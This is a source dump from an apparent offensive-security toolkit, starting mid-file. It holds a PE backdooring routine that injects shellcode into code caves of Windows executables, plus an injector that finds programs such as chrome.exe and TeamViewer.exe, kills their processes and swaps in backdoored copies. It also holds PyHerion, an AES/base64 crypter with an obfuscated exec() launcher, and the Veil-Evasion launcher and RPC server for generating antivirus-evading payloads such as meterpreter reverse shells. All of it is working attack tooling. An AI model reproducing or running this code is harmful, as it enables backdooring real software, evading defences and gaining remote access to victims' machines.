        self.flItms['cave_jumping'] = self.CAVE_JUMPING
        self.flItms['CavesPicked'] = {}
        self.flItms['LastCaveAddress'] = 0
        self.flItms['stager'] = False
        self.flItms['supplied_shellcode'] = self.SUPPLIED_SHELLCODE
        #if self.flItms['supplied_shellcode'] is not None:
        #    self.flItms['supplied_shellcode'] = open(self.SUPPLIED_SHELLCODE, 'r+b').read()
            #override other settings
        #    port = 4444
        #    host = '127.0.0.1'
        self.set_shells()
        #Move shellcode check here not before this is executed.
        #Creating file to backdoor
        self.flItms['backdoorfile'] = self.OUTPUT
        shutil.copy2(self.FILE, self.flItms['backdoorfile'])
        
        self.binary = open(self.flItms['backdoorfile'], "r+b")
        #reserve space for shellcode
        targetFile = intelCore(self.flItms, self.binary, self.VERBOSE)
        # Finding the length of the resume Exe shellcode
        if self.flItms['Magic'] == int('20B', 16):
            _, self.flItms['resumeExe'] = targetFile.resume_execution_64()
        else:
            _, self.flItms['resumeExe'] = targetFile.resume_execution_32()

        shellcode_length = len(self.flItms['shellcode'])

        self.flItms['shellcode_length'] = shellcode_length + len(self.flItms['resumeExe'])

        caves_set = False
        while caves_set is False:
            if self.flItms['NewCodeCave'] is False:
                #self.flItms['JMPtoCodeAddress'], self.flItms['CodeCaveLOC'] = (
                self.flItms['CavesPicked'] = self.find_cave()
                if self.flItms['CavesPicked'] is None:
                    self.flItms['JMPtoCodeAddress'] = None
                    self.flItms['CodeCaveLOC'] = 0
                    self.flItms['cave_jumping'] = False
                    self.flItms['CavesPicked'] = {}
                    print "-resetting shells"
                    self.set_shells()
                    caves_set = True
                elif type(self.flItms['CavesPicked']) == str:
                    if self.flItms['CavesPicked'].lower() == 'append':
                        self.flItms['JMPtoCodeAddress'] = None
                        self.flItms['CodeCaveLOC'] = 0
                        self.flItms['cave_jumping'] = False
                        self.flItms['CavesPicked'] = {}
                        print "-resetting shells"
                        self.set_shells()
                        caves_set = True
                    elif self.flItms['CavesPicked'].lower() == 'jump':
                        self.flItms['JMPtoCodeAddress'] = None
                        self.flItms['CodeCaveLOC'] = 0
                        self.flItms['cave_jumping'] = True
                        self.flItms['CavesPicked'] = {}
                        print "-resetting shells"
                        self.set_shells()
                        continue
                    elif self.flItms['CavesPicked'].lower() == 'single':
                        self.flItms['JMPtoCodeAddress'] = None
                        self.flItms['CodeCaveLOC'] = 0
                        self.flItms['cave_jumping'] = False
                        self.flItms['CavesPicked'] = {}
                        print "-resetting shells"
                        self.set_shells()
                        continue
                else:
                    self.flItms['JMPtoCodeAddress'] = self.flItms['CavesPicked'].iteritems().next()[1][6]
                    caves_set = True
            else:
                caves_set = True

        #If no cave found, continue to create one.
        if self.flItms['JMPtoCodeAddress'] is None or self.flItms['NewCodeCave'] is True:
            self.create_code_cave()
            self.flItms['NewCodeCave'] = True
            print "- Adding a new section to the exe/dll for shellcode injection"
        else:
            self.flItms['LastCaveAddress'] = self.flItms['CavesPicked'][len(self.flItms['CavesPicked']) - 1][6]

        #Patch the entry point
        targetFile = intelCore(self.flItms, self.binary, self.VERBOSE)
        targetFile.patch_initial_instructions()

        if self.flItms['Magic'] == int('20B', 16):
            ReturnTrackingAddress, self.flItms['resumeExe'] = targetFile.resume_execution_64()
        else:
            ReturnTrackingAddress, self.flItms['resumeExe'] = targetFile.resume_execution_32()

        #write instructions and shellcode
        self.flItms['allshells'] = getattr(self.flItms['shells'], self.SHELL)(self.flItms, self.flItms['CavesPicked'])
        
        if self.flItms['cave_jumping'] is True:
            if self.flItms['stager'] is False:
                temp_jmp = "\xe9"
                breakupvar = eat_code_caves(self.flItms, 1, 2)
                test_length = int(self.flItms['CavesPicked'][2][1], 16) - int(self.flItms['CavesPicked'][1][1], 16) - len(self.flItms['allshells'][1]) - 5
                #test_length = breakupvar - len(self.flItms['allshells'][1]) - 4
                if test_length < 0:
                    temp_jmp += struct.pack("<I", 0xffffffff - abs(breakupvar - len(self.flItms['allshells'][1]) - 4))
                else:
                    temp_jmp += struct.pack("<I", breakupvar - len(self.flItms['allshells'][1]) - 5)

            self.flItms['allshells'] += (self.flItms['resumeExe'], )

        self.flItms['completeShellcode'] = self.flItms['shellcode'] + self.flItms['resumeExe']
        if self.flItms['NewCodeCave'] is True:
            self.binary.seek(self.flItms['newSectionPointerToRawData'] + self.flItms['buffer'])
            self.binary.write(self.flItms['completeShellcode'])
        if self.flItms['cave_jumping'] is True:
            for i, item in self.flItms['CavesPicked'].iteritems():
                self.binary.seek(int(self.flItms['CavesPicked'][i][1], 16))
                self.binary.write(self.flItms['allshells'][i])
                #So we can jump to our resumeExe shellcode
                if i == (len(self.flItms['CavesPicked']) - 2) and self.flItms['stager'] is False:
                    self.binary.write(temp_jmp)
        else:
            for i, item in self.flItms['CavesPicked'].iteritems():
                if i == 0:
                    self.binary.seek(int(self.flItms['CavesPicked'][i][1], 16))
                    self.binary.write(self.flItms['completeShellcode'])

        print "[*] {0} backdooring complete".format(self.FILE)
        self.binary.close()
        if self.VERBOSE is True:
            print_flItms(self.flItms)

        return True


    def output_options(self):
        """
        Output file check.
        """
        if not self.OUTPUT:
            self.OUTPUT = os.path.basename(self.FILE)


    def set_shells(self):
        """
        This function sets the shellcode.
        """
        print "[*] Looking for and setting selected shellcode"
        
        if self.flItms['Magic'] == int('10B', 16):
            self.flItms['bintype'] = winI32_shellcode
        if self.flItms['Magic'] == int('20B', 16):
            self.flItms['bintype'] = winI64_shellcode
        if not self.SHELL:
            print "You must choose a backdoor to add: (use -s)"
            for item in dir(self.flItms['bintype']):
                if "__" in item:
                    continue
                elif ("returnshellcode" == item 
                    or "pack_ip_addresses" == item 
                    or "eat_code_caves" == item
                    or 'ones_compliment' == item
                    or 'resume_execution' in item
                    or 'returnshellcode' in item):
                    continue
                else:
                    print "   {0}".format(item)
            sys.exit()
        if self.SHELL not in dir(self.flItms['bintype']):
            print "The following %ss are available: (use -s)" % str(self.flItms['bintype']).split(".")[1]
            for item in dir(self.flItms['bintype']):
                #print item
                if "__" in item:
                    continue
                elif "returnshellcode" == item or "pack_ip_addresses" == item or "eat_code_caves" == item:
                    continue
                else:
                    print "   {0}".format(item)

            sys.exit()
        else:
            shell_cmd = self.SHELL + "()"
        self.flItms['shells'] = self.flItms['bintype'](self.HOST, self.PORT, self.SUPPLIED_SHELLCODE)
        self.flItms['allshells'] = getattr(self.flItms['shells'], self.SHELL)(self.flItms)
        self.flItms['shellcode'] = self.flItms['shells'].returnshellcode()

    def injector(self):
        """
        The injector module will hunt and injection shellcode into
        targets that are in the list_of_targets dict.
        Data format DICT: {process_name_to_backdoor :
                           [('dependencies to kill', ),
                           'service to kill', restart=True/False],
                           }
        """
        
        list_of_targets = {'chrome.exe':
                   [('chrome.exe', ), None, True],
                   'hamachi-2.exe':
                   [('hamachi-2.exe', ), "Hamachi2Svc", True],
                   'tcpview.exe': [('tcpview.exe',), None, True],
                   #'rpcapd.exe':
                   #[('rpcapd.exe'), None, False],
                   'psexec.exe':
                   [('psexec.exe',), 'PSEXESVC.exe', False],
                   'vncserver.exe':
                   [('vncserver.exe', ), 'vncserver', True],
                   # must append code cave for vmtoolsd.exe

                   'vmtoolsd.exe':
                   [('vmtools.exe', 'vmtoolsd.exe'), 'VMTools', True],

                   'nc.exe': [('nc.exe', ), None, False],

                   'Start Tor Browser.exe':
                   [('Start Tor Browser.exe', ), None, False],

                   'procexp.exe': [('procexp.exe',
                                    'procexp64.exe'), None, True],

                   'procmon.exe': [('procmon.exe',
                                    'procmon64.exe'), None, True],

                   'TeamViewer.exe': [('tv_x64.exe',
                                       'tv_x32.exe'), None, True]
                   }

        print "[*] Beginning injector module"
        os_name = os.name
        if os_name == 'nt':
            if "PROGRAMFILES(x86)" in os.environ:
                print "-You have a 64 bit system"
                system_type = 64
            else:
                print "-You have a 32 bit system"
                system_type = 32
        else:
            print "This works only on windows. :("
            sys.exit()
        winversion = platform.version()
        rootdir = os.path.splitdrive(sys.executable)[0]
        #print rootdir
        targetdirs = []
        excludedirs = []
        #print system_info
        winXP2003x86targetdirs = [rootdir + '\\']
        winXP2003x86excludedirs = [rootdir + '\\Windows\\',
                                   rootdir + '\\RECYCLER\\',
                                   '\\VMWareDnD\\']
        vista7win82012x64targetdirs = [rootdir + '\\']
        vista7win82012x64excludedirs = [rootdir + '\\Windows\\',
                                        rootdir + '\\RECYCLER\\',
                                        '\\VMwareDnD\\']

        #need win2003, win2008, win8
        if "5.0." in winversion:
            print "-OS is 2000"
            targetdirs = targetdirs + winXP2003x86targetdirs
            excludedirs = excludedirs + winXP2003x86excludedirs
        elif "5.1." in winversion:
            print "-OS is XP"
            if system_type == 64:
                targetdirs.append(rootdir + '\\Program Files (x86)\\')
                excludedirs.append(vista7win82012x64excludedirs)
            else:
                targetdirs = targetdirs + winXP2003x86targetdirs
                excludedirs = excludedirs + winXP2003x86excludedirs
        elif "5.2." in winversion:
            print "-OS is 2003"
            if system_type == 64:
                targetdirs.append(rootdir + '\\Program Files (x86)\\')
                excludedirs.append(vista7win82012x64excludedirs)
            else:
                targetdirs = targetdirs + winXP2003x86targetdirs
                excludedirs = excludedirs + winXP2003x86excludedirs
        elif "6.0." in winversion:
            print "-OS is Vista/2008"
            if system_type == 64:
                targetdirs = targetdirs + vista7win82012x64targetdirs
                excludedirs = excludedirs + vista7win82012x64excludedirs
            else:
                targetdirs.append(rootdir + '\\Program Files\\')
                excludedirs.append(rootdir + '\\Windows\\')
        elif "6.1." in winversion:
            print "-OS is Win7/2008"
            if system_type == 64:
                targetdirs = targetdirs + vista7win82012x64targetdirs
                excludedirs = excludedirs + vista7win82012x64excludedirs
            else:
                targetdirs.append(rootdir + '\\Program Files\\')
                excludedirs.append(rootdir + '\\Windows\\')
        elif "6.2." in winversion:
            print "-OS is Win8/2012"
            targetdirs = targetdirs + vista7win82012x64targetdirs
            excludedirs = excludedirs + vista7win82012x64excludedirs

        filelist = set()
        folderCount = 0

        exclude = False
        for path in targetdirs:
            for root, subFolders, files in os.walk(path):
                for directory in excludedirs:
                    if directory.lower() in root.lower():
                        #print directory.lower(), root.lower()
                        #print "Path not allowed", root
                        exclude = True
                        #print exclude
                        break
                if exclude is False:
                    for _file in files:
                        f = os.path.join(root, _file)
                        for target, items in list_of_targets.iteritems():
                            if target.lower() == _file.lower():
                                #print target, f
                                print "-- Found the following file:", root + '\\' + _file
                                filelist.add(f)
                                #print exclude
                exclude = False

        #grab tasklist
        process_list = []
        all_process = os.popen("tasklist.exe")
        ap = all_process.readlines()
        all_process.close()
        ap.pop(0)   # remove blank line
        ap.pop(0)   # remove header line
        ap.pop(0)   # remove this ->> =======

        for process in ap:
            process_list.append(process.split())

        #print process_list
        #print filelist
        for target in filelist:
            service_target = False
            running_proc = False
            #get filename
            #support_result = support_check(target, 0)
            #if support_result is False:
            #   continue
            filename = os.path.basename(target)
            file_path = os.path.dirname(target) + '\\'
            for process in process_list:
                #print process
                for setprocess, items in list_of_targets.iteritems():
                    if setprocess.lower() in target.lower():
                        #print setprocess, process
                        for item in items[0]:
                            if item.lower() in [x.lower() for x in process]:
                                print "- Killing process:", item
                                try:
                                    #print process[1]
                                    os.system("taskkill /F /PID %i" %
                                              int(process[1]))
                                    running_proc = True
                                except Exception as e:
                                    print str(e)
                        if setprocess.lower() in [x.lower() for x in process]:
                            #print True, items[0], items[1]
                            if items[1] is not None:
                                print "- Killing Service:", items[1]
                                try:
                                    os.system('net stop %s' % items[1])
                                except Exception as e:
                                    print str(e)
                                service_target = True

            time.sleep(1)
            #backdoor the targets here:
            print "*" * 50
            self.FILE = target
            self.OUTPUT = os.path.basename(self.FILE + '.bd')
            print "self.OUTPUT", self.OUTPUT
            print "- Backdooring:",  self.FILE
            result = self.patch_pe()
            if result:  
                pass
            else:
                continue
            shutil.copy2(self.FILE, self.FILE + self.SUFFIX)
            os.chmod(self.FILE, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)
            time.sleep(1)
            try:
                os.unlink(self.FILE)
            except:
                print "unlinking error"
            time.sleep(.5)
            try:
                shutil.copy2(self.OUTPUT,  self.FILE)
            except:
                os.system('move {0} {1}'.format( self.FILE, self.OUTPUT))
            time.sleep(.5)
            os.remove(self.OUTPUT)
            print (" - The original file {0} has been renamed to {1}".format(self.FILE,
                   self.FILE + self.SUFFIX))
        
            if self.DELETE_ORIGINAL is True:
                print "!!Warning Deleteing Original File!!"
                os.remove(self.FILE + self.SUFFIX)

            if service_target is True:
                #print "items[1]:", list_of_targets[filename][1]
                os.system('net start %s' % list_of_targets[filename][1])
            else:
                try:
                    if (list_of_targets[filename][2] is True and
                       running_proc is True):
                        subprocess.Popen([self.FILE, ])
                        print "- Restarting:", self.FILE
                    else:
                        print "-- %s was not found online -  not restarting" % self.FILE

                except:
                    if (list_of_targets[filename.lower()][2] is True and
                       running_proc is True):
                        subprocess.Popen([self.FILE, ])
                        print "- Restarting:", self.FILE
                    else:
                        print "-- %s was not found online -  not restarting" % self.FILE


########NEW FILE########
__FILENAME__ = pyherion
#!/usr/bin/python

"""
PyHerion 1.0
By: @harmj0y


Python 'crypter' that builds an dynamic AES/base64 encoded launcher
(with a random key) that's decoded/decrypted in memory and then executed.


Standalone version of the same functionality integrated into Veil,
in ./modules/common/encryption.py

"""

from Crypto.Cipher import AES
import base64, random, string, sys

# crypto config stuff
BLOCK_SIZE = 32
PADDING = '{'

# used for separting out the import lines
imports = list()
output = list()

# check to make sure it's being called properly
if len(sys.argv) < 2 or len(sys.argv) > 3:
	print "\nPyherion 1.0\n\n\tusage:\t./pyherion.py intputfile [outputfile]\n"
	sys.exit()

# returns a random string/key of "bytes" length
def randKey(bytes):
	return ''.join(random.choice(string.ascii_letters + string.digits + "{}!@#$^&()*&[]|,./?") for x in range(bytes))

# random 3 letter variable generator
def randVar():
	return ''.join(random.choice(string.ascii_letters) for x in range(3)) + "_" + ''.join(random.choice("0123456789") for x in range(3))

# one-liner to sufficiently pad the text to be encrypted
pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING

# one-liner to encrypt a code block then base64 it
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

# generate our key and initialization vector
key = randKey(32)
iv = randKey(16)

input = open(sys.argv[1]).readlines()
pieces = sys.argv[1].split(".")

# build our new filename, "payload.py" -> "payload_crypted.py"
outputName = ".".join(pieces[:-2]) + pieces[-2] + "_crypted." + pieces[-1]

# check if the output name was specified, otherwise use the one built above
if len(sys.argv) == 3:
	outputName = sys.argv[2]

f = open(outputName, 'w')

# Detect if the passed argument is a python file
if pieces[-1] == "py":
	# separate imports from code- this is because pyinstaller needs to 
	# know what imports to package with the .exe at compile time. 
	# Otherwise the imports in the exec() string won't work
	for line in input:
		if not line.startswith("#"): # ignore commented imports...
			if "import" in line:
				imports.append(line.strip())
			else:
				output.append(line)

	# build our AES cipher
	cipherEnc = AES.new(key)

	# encrypt the input file (less the imports)
	encrypted = EncodeAES(cipherEnc, "".join(output))
	
	b64var = randVar()
	aesvar = randVar()

	# randomize our base64 and AES importing variable
	imports.append("from base64 import b64decode as %s" %(b64var))
	imports.append("from Crypto.Cipher import AES as %s" %(aesvar))

	# shuffle up our imports
	random.shuffle(imports)
	f.write(";".join(imports) + "\n")

	# build the exec() launcher
	f.write("exec(%s(\"%s\"))" % (b64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(aesvar,key,b64var,encrypted))))
	f.close()

else:
	print "\nonly python files can be used as input files"
	sys.exit()

print "\n\tCrypted output written to %s\n" % (outputName)

########NEW FILE########
__FILENAME__ = Veil-Evasion
#!/usr/bin/python

"""
Front end launcher for the Veil AV-evasion framework.

Handles command line switches for all options.
A modules.commoncontroller.Controller() object is instantiated with the
appropriate switches, or the interactive menu is triggered if no switches
are provided.
"""

# Import Modules
import sys, argparse, time, os, base64, socket
try:
    import symmetricjsonrpc
except ImportError:
    print '========================================================================='
    print ' Necessary install component missing'
    print ' Re-running ./setup/setup.sh'
    print '========================================================================='
    time.sleep(3)
    os.system('cd setup && ./setup.sh')
    try:
        import symmetricjsonrpc
    except ImportError:
        print '\n [!] Error importing pip'
        print " [!] Please run 'pip install symmetricjsonrpc' manually\n"
        sys.exit()

from modules.common import controller
from modules.common import messages
from modules.common import supportfiles
from modules.common import helpers


"""
The RPC-handler code.

The RPC requests are as follows:
    method="version"            -   return the current Veil-Evasion version number
    method="payloads"           -   return all the currently loaded payloads
    method="payload_options"
        params="payload_name"   -   return the options for the specified payload
    method="generate"
        params=["payload=X",    -   generate the specified payload with the given options
                "outputbase=Y"
                "overwrite=Z",
                "msfpayload=...",
                "LHOST=blah]

The return value will be the path to the generated executable.

You can start the server with "./Veil-Evasion.py --rpc" and shut it down with
    "./Veil-Evasin.py --rpcshutdown"

"""
class VeilEvasionServer(symmetricjsonrpc.RPCServer):
    class InboundConnection(symmetricjsonrpc.RPCServer.InboundConnection):
        class Thread(symmetricjsonrpc.RPCServer.InboundConnection.Thread):
            class Request(symmetricjsonrpc.RPCServer.InboundConnection.Thread.Request):

                # handle an RPC notification
                def dispatch_notification(self, subject):
                    print "dispatch_notification(%s)" % (repr(subject),)
                    # Shutdown the server.
                    print "[!] Shutting down Veil-Evasion RPC server..."
                    self.parent.parent.parent.shutdown()

                # handle an RPC request
                def dispatch_request(self, subject):
                    print "dispatch_request(%s)" % (repr(subject),)

                    try:
                        # extract the method name and associated parameters
                        method = subject['method']
                        params = subject['params']

                        # instantiate a main Veil-Evasion controller
                        con = controller.Controller(oneRun=False)

                        # handle a request for version
                        if method == "version":
                            return messages.version

                        # handle a request to list all payloads
                        elif method == "payloads":
                            payloads = []
                            # return a list of all available payloads, no params needed
                            for (name, payload) in con.payloads:
                                payloads.append(name)
                            return payloads

                        # handle a request to list a particular payload's options
                        elif method == "payload_options":
                            # returns options available for a particular payload
                            options = []

                            if len(params) > 0:
                                # nab the payload name
                                payloadname = params[0]

                                # find this payload from what's available
                                for (name, payload) in con.payloads:

                                    if payloadname.lower() == name.lower():
                                        p = payload
                                        # see what required options are available
                                        if hasattr(p, 'required_options'):
                                            for key in sorted(p.required_options.iterkeys()):
                                                # return for the option - name,default_value,description
                                                options.append( (key, p.required_options[key][0], p.required_options[key][1]) )
                                        # check if this is a shellcode-utilizing payload
                                        if hasattr(p, 'shellcode'):
                                            options.append("shellcode")
                            return options

                        # handle a request to generate a payload
                        elif method == "generate":
                            
                            if len(params) > 0:
                                payloadName,outputbase = "", ""
                                overwrite = False
                                payload = None
                                options = {}
                                options['required_options'] = {}

                                # pull these metaoptions out first
                                try:
                                    for param in params:
                                        if param.startswith("payload="):
                                            t,payloadName = param.split("=")
                                        elif param.startswith("outputbase="):
                                            t,outputbase = param.split("=")
                                        elif param.startswith("overwrite="):
                                            t,choice = param.split("=")
                                            if choice.lower() == "true":
                                                overwrite = True
                                except:
                                    return ""

                                # find our payload in the controller object list
                                for (name, p) in con.payloads:
                                    if payloadName.lower() == name.lower():
                                        payload = p

                                # error checking
                                if not payload: return ""

                                # parse all the parameters
                                for param in params:

                                    # don't include these metaoptions
                                    if param.startswith("payload=") or param.startswith("outputbase=") or param.startswith("overwrite="):
                                        continue 

                                    # extract the name/value from this parameter
                                    name,value = param.split("=")
                                    required_options = []

                                    # extract the required options if they're there
                                    if hasattr(payload, 'required_options'):
                                        required_options = payload.required_options.iterkeys()

                                    # if the value we're passed is in the required options
                                    if name in required_options:
                                        options['required_options'][name] = [value, ""]
                                    elif name == "shellcode":
                                        options['customShellcode'] = value
                                    elif name == "msfpayload" or name == "msfvenom":
                                        options['msfvenom'] = [value, []]

                                    # assume we have msfvenom options otherwise
                                    else:
                                        # temporarily get the msfoptions out
                                        t = options['msfvenom']
                                        if not t[1]:
                                            # if there are no existing options
                                            options['msfvenom'] = [t[0], [str((name+"="+value))] ]
                                        else:
                                            # if there are, append
                                            options['msfvenom'] = [t[0], t[1] + [str((name+"="+value))] ]

                                # manually set the payload in the controller object
                                con.SetPayload(payloadName, options)

                                # generate the payload code
                                code = con.GeneratePayload()
                                
                                class Args(object): pass
                                args = Args()
                                args.overwrite=overwrite
                                args.o = outputbase

                                # write out the payload code to the proper output file
                                outName = con.OutputMenu(con.payload, code, showTitle=False, interactive=False, args=args)

                                # return the written filename
                                return outName

                            else:
                                return ""
                        else:
                            return ""
                    except:
                        return ""


def runRPC(port=4242):
    """
    Invoke a Veil-Evasion RPC instance on the specified port.
    """

    print "[*] Starting Veil-Evasion RPC server..."
    # Set up a TCP socket
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    #  Start listening on the socket for connections
    s.bind(('', port))
    s.listen(1)

    # Create a server thread handling incoming connections
    server = VeilEvasionServer(s, name="VeilEvasionServer")

    # Wait for the server to stop serving clients
    server.join()


def shutdownRPC(port=4242):
    """
    Shutdown a running Veil-Evasion RPC server on a specified port.
    """

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    #  Connect to the server
    s.connect(('localhost', 4242))

    # Create a client thread handling for incoming requests
    client = symmetricjsonrpc.RPCClient(s)

    # shut the server down
    client.notify("shutdown")
    client.shutdown()
    print "[!] Veil-Evasion RPC server shutdown"


if __name__ == '__main__':
    try:
        # keep Veil.pyc from appearing?
        sys.dont_write_bytecode = True

        parser = argparse.ArgumentParser()
        parser.add_argument('-p', metavar="PAYLOAD", nargs='?', const="list", help='Payload to generate. Lists payloads if none specified.')
        parser.add_argument('-c', metavar='OPTION=value', nargs='*', help='Custom payload module options.')
        parser.add_argument('-o', metavar="OUTPUTBASE", default="payload", help='Output file base for source and compiled .exes.')
        parser.add_argument('--msfpayload', metavar="windows/meterpreter/reverse_tcp", nargs='?', help='Metasploit shellcode to generate.')
        parser.add_argument('--msfoptions', metavar="OPTION=value", nargs='*', help='Options for the specified metasploit payload.')
        parser.add_argument('--custshell', metavar="\\x00...", help='Custom shellcode string to use.')
        parser.add_argument('--pwnstaller', action='store_true', help='Use the Pwnstaller obfuscated loader.')
        parser.add_argument('--update', action='store_true', help='Update the Veil framework.')
        parser.add_argument('--clean', action='store_true', help='Clean out payload folders.')
        parser.add_argument('--overwrite', action='store_true', help='Overwrite payload/source output files if they already exist.')
        parser.add_argument('--rpc', action='store_true', help='Run Veil-Evasion as an RPC server.')
        parser.add_argument('--rpcshutdown', action='store_true', help='Shutdown a running Veil-Evasion RPC server.')
        args = parser.parse_args()

        # start up the RPC server
        if args.rpc:
            runRPC()
            sys.exit()

        # shutdown the RPC server
        if args.rpcshutdown:
            shutdownRPC()
            sys.exit()

        # Print main title
        messages.title()

        # instantiate the main controller object
        controller = controller.Controller(oneRun=False)

        # call the update functionality for Veil and then exit
        if args.update:
            controller.UpdateVeil(interactive=False)
            sys.exit()

        # call the payload folder cleaning for Veil and then exit
        if args.clean:
            controller.CleanPayloads(interactive=False)
            sys.exit()

        # use interactive menu if a payload isn't specified
        if not args.p:
            controller.MainMenu(args=args)
            sys.exit()

        # list languages available if "-p" is present but no payload specified
        elif args.p == "list":
            controller.ListPayloads()
            sys.exit()
        
        # pull out any required options from the command line and
        # build the proper dictionary so we can set the payload manually
        options = {}
        if args.c:
            options['required_options'] = {}
            for option in args.c:
                name,value = option.split("=")
                options['required_options'][name] = [value, ""]

        # pull out any msfvenom shellcode specification and msfvenom options
        if args.msfpayload:
            if args.msfoptions:
                options['msfvenom'] = [args.msfpayload, args.msfoptions]
            else:
                options['msfvenom'] = [args.msfpayload, None]

        # manually set the payload in the controller object
        controller.SetPayload(args.p, options)

        # generate the payload code
        code = controller.GeneratePayload()

        # write out the payload code to the proper output file
        outName = controller.OutputMenu(controller.payload, code, showTitle=False, interactive=False, args=args)

    # Catch ctrl + c interrupts from the user
    except KeyboardInterrupt:
        print helpers.color("\n\n [!] Exiting...\n", warning=True)


########NEW FILE########
